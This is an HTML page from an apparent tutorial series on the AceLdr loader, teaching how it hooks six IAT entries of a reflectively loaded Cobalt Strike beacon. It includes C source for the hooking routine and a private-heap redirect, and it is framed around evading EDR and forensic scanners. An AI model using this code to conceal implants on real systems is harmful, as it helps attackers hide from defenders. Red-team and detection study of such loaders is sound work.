@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6: IAT Hooking &amp; Heap Redirection - AceLdr Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🖥️</text></svg>">
+<link rel="stylesheet" href="../../assets/course.css">
+<style>:root{--accent:#00d4ff;--accent2:#7c3aed;--gradient:linear-gradient(135deg,#00d4ff,#7c3aed)}</style>
+</head>
+<body>
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+<nav>
+  <div class="logo">
+    <h2>AceLdr Course</h2>
+    <span>Memory Evasion Masterclass</span>
+  </div>
+  <a class="home-link" href="../AceLdr_index.html">&larr; Course Home</a>
+  <a class="mod-link" href="module1.html"><span>1. Windows Memory 101</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module2.html"><span>2. PE File Format</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module3.html"><span>3. PEB &amp; API Hashing</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module4.html"><span>4. Reflective Loading</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module5.html"><span>5. Position-Independent Code</span><span class="diff d2">d2</span></a>
+  <a class="mod-link active" href="module6.html"><span>6. IAT Hooking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module7.html"><span>7. Return Addr Spoofing</span><span class="diff d3">d3</span></a>
+  <a class="mod-link" href="module8.html"><span>8. FOLIAGE Sleep Mask</span><span class="diff d3">d3</span></a>
+  <a class="mod-link" href="module9.html"><span>9. Full Chain &amp; Integration</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<h1>Module 6: IAT Hooking &amp; Heap Redirection</h1>
+<p class="subtitle">Intercepting API calls to control beacon behavior from within</p>
+<span class="diff-badge medium">Intermediate</span>
+
+<!-- ===== Section 1: Overview ===== -->
+<h2>Why Hook the IAT?</h2>
+
+<div class="card highlight">
+<h4>Core Idea</h4>
+<p>After AceLdr reflectively loads the Cobalt Strike beacon into memory, the beacon's Import Address Table (IAT) contains pointers to Windows API functions. By <strong>overwriting specific IAT entries</strong> with pointers to our own hook functions, we gain control over every call the beacon makes to those APIs &mdash; without patching any code bytes in ntdll or kernel32.</p>
+</div>
+
+<p>This technique is critical because it lets AceLdr:</p>
+<ul>
+  <li><strong>Redirect heap allocations</strong> to a private heap (invisible to standard forensic tools)</li>
+  <li><strong>Spoof return addresses</strong> on sensitive API calls (covered in depth in Module 7)</li>
+  <li><strong>Intercept sleep calls</strong> to activate the FOLIAGE sleep mask (Module 8)</li>
+</ul>
+
+<div class="card warn">
+<h4>IAT Hooking vs. Inline Hooking</h4>
+<p>Unlike inline hooks (which patch the first bytes of a target function with a <code>JMP</code>), IAT hooks modify <em>pointers</em> in the caller's import table. This is stealthier because no executable code is modified &mdash; the target DLL remains pristine. The trade-off is that IAT hooks only intercept calls made through the import table of the specific module you patch.</p>
+</div>
+
+<!-- ===== Section 2: The 6 Hooks ===== -->
+<h2>The Six IAT Hooks</h2>
+
+<p>AceLdr installs exactly <strong>6 hooks</strong> in the beacon's IAT. Each hook serves a distinct evasion purpose:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Original API</th>
+      <th>Hook Function</th>
+      <th>Purpose</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>Sleep</code></td>
+      <td><code>Sleep_Hook</code></td>
+      <td>Activates FOLIAGE sleep masking (encrypt heap, mask thread context)</td>
+    </tr>
+    <tr>
+      <td><code>GetProcessHeap</code></td>
+      <td><code>GetProcessHeap_Hook</code></td>
+      <td>Returns AceLdr's private heap instead of the process default heap</td>
+    </tr>
+    <tr>
+      <td><code>HeapAlloc</code></td>
+      <td><code>HeapAlloc_Hook</code></td>
+      <td>Spoofs the return address before calling the real HeapAlloc</td>
+    </tr>
+    <tr>
+      <td><code>RtlAllocateHeap</code></td>
+      <td><code>RtlAllocateHeap_Hook</code></td>
+      <td>Spoofs the return address before calling the real RtlAllocateHeap</td>
+    </tr>
+    <tr>
+      <td><code>InternetConnectA</code></td>
+      <td><code>InternetConnectA_Hook</code></td>
+      <td>Spoofs the return address before calling the real InternetConnectA</td>
+    </tr>
+    <tr>
+      <td><code>NtWaitForSingleObject</code></td>
+      <td><code>NtWaitForSingleObject_Hook</code></td>
+      <td>Spoofs the return address before calling the real NtWaitForSingleObject</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="card green">
+<h4>Pattern Recognition</h4>
+<p>Notice the pattern: 4 out of 6 hooks exist solely to <strong>spoof return addresses</strong>. The remaining two serve specialized purposes &mdash; <code>Sleep_Hook</code> triggers the full FOLIAGE sleep chain, and <code>GetProcessHeap_Hook</code> redirects all beacon heap allocations to a private, controlled heap.</p>
+</div>
+
+<!-- ===== Section 3: LdrHookImport ===== -->
+<h2>LdrHookImport &mdash; The Hook Installation Engine</h2>
+
+<p>The workhorse function that performs the actual IAT patching lives in <code>util.c</code>. It walks the beacon's import directory, finds the matching DLL and function, and overwrites the IAT entry:</p>
+
+<pre><code><span class="lang-tag">C &mdash; util.c</span>
+VOID LdrHookImport(
+    PVOID  Image,       // Base address of the loaded beacon
+    ULONG  ImpHash,     // Hash of the DLL name (e.g., hash of "kernel32.dll")
+    ULONG  FuncHash,    // Hash of the function name (e.g., hash of "Sleep")
+    PVOID  HookFunc     // Pointer to our hook function
+) {
+    PIMAGE_DOS_HEADER       Dos  = Image;
+    PIMAGE_NT_HEADERS       Nt   = (PVOID)((UINT_PTR)Image + Dos->e_lfanew);
+    PIMAGE_DATA_DIRECTORY   Dir  = &Nt->OptionalHeader.DataDirectory[1]; // IMPORT dir
+
+    // Walk each IMAGE_IMPORT_DESCRIPTOR
+    for (PIMAGE_IMPORT_DESCRIPTOR Imp = (PVOID)((UINT_PTR)Image + Dir->VirtualAddress);
+         Imp->Name != 0;
+         Imp++) {
+
+        // Check if this descriptor matches our target DLL
+        PCHAR DllName = (PCHAR)((UINT_PTR)Image + Imp->Name);
+        if (HashString(DllName) != ImpHash)
+            continue;
+
+        // Walk the Original First Thunk (names) and First Thunk (addresses)
+        PIMAGE_THUNK_DATA Oft = (PVOID)((UINT_PTR)Image + Imp->OriginalFirstThunk);
+        PIMAGE_THUNK_DATA Ft  = (PVOID)((UINT_PTR)Image + Imp->FirstThunk);
+
+        for (; Oft->u1.AddressOfData != 0; Oft++, Ft++) {
+            // Skip ordinal imports
+            if (IMAGE_SNAP_BY_ORDINAL(Oft->u1.Ordinal))
+                continue;
+
+            PIMAGE_IMPORT_BY_NAME Ibn = (PVOID)((UINT_PTR)Image + Oft->u1.AddressOfData);
+
+            // If function name hash matches, overwrite the IAT entry
+            if (HashString(Ibn->Name) == FuncHash) {
+                Ft->u1.Function = (UINT_PTR)HookFunc;
+                return;
+            }
+        }
+    }
+}</code></pre>
+
+<h3>Step-by-Step Walkthrough</h3>
+<ol>
+  <li><strong>Parse PE headers</strong> &mdash; Navigate from the DOS header to the NT headers, then to the Import Data Directory (index 1).</li>
+  <li><strong>Walk import descriptors</strong> &mdash; Each descriptor represents one DLL that the beacon imports from. Compare each DLL name's hash against <code>ImpHash</code>.</li>
+  <li><strong>Walk thunk arrays</strong> &mdash; The OriginalFirstThunk (OFT) array holds function name RVAs; the FirstThunk (FT) array holds the actual resolved function addresses (the IAT).</li>
+  <li><strong>Match &amp; overwrite</strong> &mdash; When the function name hash matches <code>FuncHash</code>, overwrite <code>Ft->u1.Function</code> with the hook pointer. The beacon will now call our hook instead of the real API.</li>
+</ol>
+
+<div class="card warn">
+<h4>No VirtualProtect Needed</h4>
+<p>During reflective loading, AceLdr has already set the IAT section to <code>PAGE_READWRITE</code>. Since we control the memory permissions of the loaded beacon, there's no need to call <code>VirtualProtect</code> before overwriting &mdash; a step that would generate suspicious API call patterns visible to EDR.</p>
+</div>
+
+<!-- ===== Section 4: GetProcessHeap_Hook ===== -->
+<h2>GetProcessHeap_Hook &mdash; Heap Redirection</h2>
+
+<p>This is one of the simplest yet most impactful hooks. The entire implementation is a single line:</p>
+
+<pre><code><span class="lang-tag">C &mdash; hooks/heap.c</span>
+HANDLE WINAPI GetProcessHeap_Hook(VOID) {
+    return C_PTR(STUB.Heap);  // OFFSET macro resolves STUB.Heap at runtime
+}</code></pre>
+
+<h3>What This Achieves</h3>
+
+<div class="diagram">
+  <h4 style="text-align:center;color:var(--accent);margin-bottom:15px;">Heap Redirection Flow</h4>
+  <div class="flow">
+    <div class="box y">Beacon calls<br><code>GetProcessHeap()</code></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box hl">IAT redirects to<br><code>GetProcessHeap_Hook</code></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box g">Returns<br><code>STUB.Heap</code></div>
+  </div>
+  <div class="flow" style="margin-top:15px;">
+    <div class="box y">Beacon calls<br><code>HeapAlloc(heap, ...)</code></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box hl">Allocates on<br>private heap</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box g">Invisible to<br>heap scanners</div>
+  </div>
+</div>
+
+<p><code>STUB.Heap</code> is a private heap created earlier by AceLdr via <code>RtlCreateHeap</code>. By returning this handle instead of the process's default heap, every subsequent <code>HeapAlloc</code>/<code>HeapFree</code> call the beacon makes operates on our private heap. This has two benefits:</p>
+
+<ul>
+  <li><strong>Forensic evasion</strong> &mdash; Tools that scan the default process heap for beacon artifacts (strings, config data, C2 URLs) will find nothing. The beacon's data lives on a separate, unlisted heap.</li>
+  <li><strong>Sleep masking</strong> &mdash; During the FOLIAGE sleep mask, AceLdr can walk and encrypt <em>only</em> the private heap. Since all beacon allocations funnel through it, encryption is comprehensive and targeted.</li>
+</ul>
+
+<div class="card highlight">
+<h4>The OFFSET Macro</h4>
+<p>Because AceLdr is position-independent code (PIC), it cannot use global variables directly. The <code>C_PTR(STUB.Heap)</code> pattern (and the <code>OFFSET</code> macro it typically wraps) calculates the runtime address of <code>STUB.Heap</code> relative to the current instruction pointer. This ensures the code works regardless of where it's loaded in memory.</p>
+</div>
+
+<!-- ===== Section 5: installHooks ===== -->
+<h2>installHooks &mdash; Wiring It All Together</h2>
+
+<p>After the beacon is reflectively loaded and its imports resolved, <code>installHooks</code> in <code>ace.c</code> calls <code>LdrHookImport</code> six times &mdash; once for each hook:</p>
+
+<pre><code><span class="lang-tag">C &mdash; ace.c</span>
+VOID installHooks(PVOID BeaconBase) {
+    // Hook Sleep -> Sleep_Hook (FOLIAGE sleep masking)
+    LdrHookImport(BeaconBase,
+        HASH_KERNEL32,    // DLL hash: "kernel32.dll"
+        HASH_SLEEP,       // Function hash: "Sleep"
+        C_PTR(Sleep_Hook));
+
+    // Hook GetProcessHeap -> GetProcessHeap_Hook (private heap)
+    LdrHookImport(BeaconBase,
+        HASH_KERNEL32,
+        HASH_GETPROCESSHEAP,
+        C_PTR(GetProcessHeap_Hook));
+
+    // Hook HeapAlloc -> HeapAlloc_Hook (return addr spoofing)
+    LdrHookImport(BeaconBase,
+        HASH_KERNEL32,
+        HASH_HEAPALLOC,
+        C_PTR(HeapAlloc_Hook));
+
+    // Hook RtlAllocateHeap -> RtlAllocateHeap_Hook (return addr spoofing)
+    LdrHookImport(BeaconBase,
+        HASH_NTDLL,       // DLL hash: "ntdll.dll"
+        HASH_RTLALLOCATEHEAP,
+        C_PTR(RtlAllocateHeap_Hook));
+
+    // Hook InternetConnectA -> InternetConnectA_Hook (return addr spoofing)
+    LdrHookImport(BeaconBase,
+        HASH_WININET,     // DLL hash: "wininet.dll"
+        HASH_INTERNETCONNECTA,
+        C_PTR(InternetConnectA_Hook));
+
+    // Hook NtWaitForSingleObject -> NtWaitForSingleObject_Hook (return addr spoofing)
+    LdrHookImport(BeaconBase,
+        HASH_NTDLL,
+        HASH_NTWAITFORSINGLEOBJECT,
+        C_PTR(NtWaitForSingleObject_Hook));
+}</code></pre>
+
+<h3>The PTR_TO_HOOK Macro</h3>
+
+<p>In AceLdr's actual source code, some of these hook installations use the <code>PTR_TO_HOOK</code> macro for brevity:</p>
+
+<pre><code><span class="lang-tag">C &mdash; macro definition</span>
+#define PTR_TO_HOOK(base, dll_hash, func_hash, hook_fn) \
+    LdrHookImport(base, dll_hash, func_hash, C_PTR(hook_fn))</code></pre>
+
+<p>This macro simply wraps <code>LdrHookImport</code> with the <code>C_PTR</code> wrapper on the hook function. It reduces visual noise when installing multiple hooks in sequence, but the underlying mechanism is identical.</p>
+
+<div class="card highlight">
+<h4>Installation Order</h4>
+<p>The hooks are installed <strong>after</strong> reflective loading resolves all legitimate imports but <strong>before</strong> the beacon's entry point (<code>DllMain</code>) is called. This ensures that from the beacon's very first instruction, all API calls are already intercepted.</p>
+</div>
+
+<!-- ===== Section 6: Deeper Look ===== -->
+<h2>How IAT Hooking Fits the Big Picture</h2>
+
+<div class="diagram">
+  <h4 style="text-align:center;color:var(--accent);margin-bottom:15px;">AceLdr Hook Architecture</h4>
+  <div class="flow">
+    <div class="box">Reflective<br>Load</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box hl">Install 6<br>IAT Hooks</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box g">Call Beacon<br>DllMain</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box y">Beacon Runs<br>(all calls hooked)</div>
+  </div>
+  <div class="flow" style="margin-top:15px;">
+    <div class="box" style="min-width:180px;">Sleep &rarr; FOLIAGE chain</div>
+    <span class="arrow">|</span>
+    <div class="box" style="min-width:180px;">Heap &rarr; Private heap</div>
+    <span class="arrow">|</span>
+    <div class="box" style="min-width:180px;">4 APIs &rarr; Spoofed returns</div>
+  </div>
+</div>
+
+<p>The IAT hooks are the <strong>control plane</strong> of AceLdr's evasion strategy. Without them, the beacon would use the default heap (visible to scanners), sleep without encryption (visible to memory scanners), and make API calls with legitimate return addresses pointing back into suspicious unbacked memory (visible to stack walkers).</p>
+
+<h3>Defense-in-Depth Through Hooks</h3>
+<ul>
+  <li><strong>Layer 1: Heap isolation</strong> &mdash; <code>GetProcessHeap_Hook</code> ensures all beacon data is on a private heap</li>
+  <li><strong>Layer 2: Return address spoofing</strong> &mdash; 4 hooks wrap calls with spoofed return addresses so stack traces look legitimate</li>
+  <li><strong>Layer 3: Sleep masking</strong> &mdash; <code>Sleep_Hook</code> triggers full FOLIAGE encryption before any sleep period</li>
+</ul>
+
+<!-- ===== Quiz ===== -->
+<h2>Knowledge Check</h2>
+
+<div class="quiz" id="quiz6">
+  <h4>Module 6 Quiz</h4>
+
+  <div class="quiz-q" data-correct="1">
+    <p>1. How many IAT entries does AceLdr overwrite in the beacon's import table?</p>
+    <label data-opt="0"><input type="radio" name="q6_1"> 3 &mdash; Sleep, HeapAlloc, and NtWaitForSingleObject</label>
+    <label data-opt="1"><input type="radio" name="q6_1"> 6 &mdash; Sleep, GetProcessHeap, HeapAlloc, RtlAllocateHeap, InternetConnectA, NtWaitForSingleObject</label>
+    <label data-opt="2"><input type="radio" name="q6_1"> 8 &mdash; all kernel32 and ntdll imports</label>
+    <label data-opt="3"><input type="radio" name="q6_1"> 1 &mdash; only Sleep for the FOLIAGE chain</label>
+    <div class="explain">AceLdr hooks exactly 6 IAT entries. Each serves a specific evasion purpose: Sleep triggers FOLIAGE, GetProcessHeap redirects to a private heap, and the remaining 4 spoof return addresses on sensitive API calls.</div>
+  </div>
+
+  <div class="quiz-q" data-correct="2">
+    <p>2. What does <code>GetProcessHeap_Hook</code> return?</p>
+    <label data-opt="0"><input type="radio" name="q6_2"> NULL, forcing the beacon to create its own heap</label>
+    <label data-opt="1"><input type="radio" name="q6_2"> The real process heap handle, after logging the call</label>
+    <label data-opt="2"><input type="radio" name="q6_2"> STUB.Heap &mdash; a handle to AceLdr's private heap</label>
+    <label data-opt="3"><input type="radio" name="q6_2"> A randomly generated heap handle for obfuscation</label>
+    <div class="explain"><code>GetProcessHeap_Hook</code> is a single-line function that returns <code>STUB.Heap</code> &mdash; a private heap created by AceLdr via <code>RtlCreateHeap</code>. This redirects all beacon allocations to a heap that is invisible to tools scanning the process's default heap.</div>
+  </div>
+
+  <button class="quiz-btn" onclick="gradeQuiz('quiz6')">Check Answers</button>
+  <div class="quiz-result"></div>
+</div>
+
+<!-- ===== Navigation ===== -->
+<div class="nav-btns">
+  <a href="module5.html">&larr; Module 5: Position-Independent Code</a>
+  <a href="module7.html" class="primary">Module 7: Return Addr Spoofing &rarr;</a>
+</div>
+</main>
+
+<script src="../../assets/course.js"></script>
+</body>
+</html>
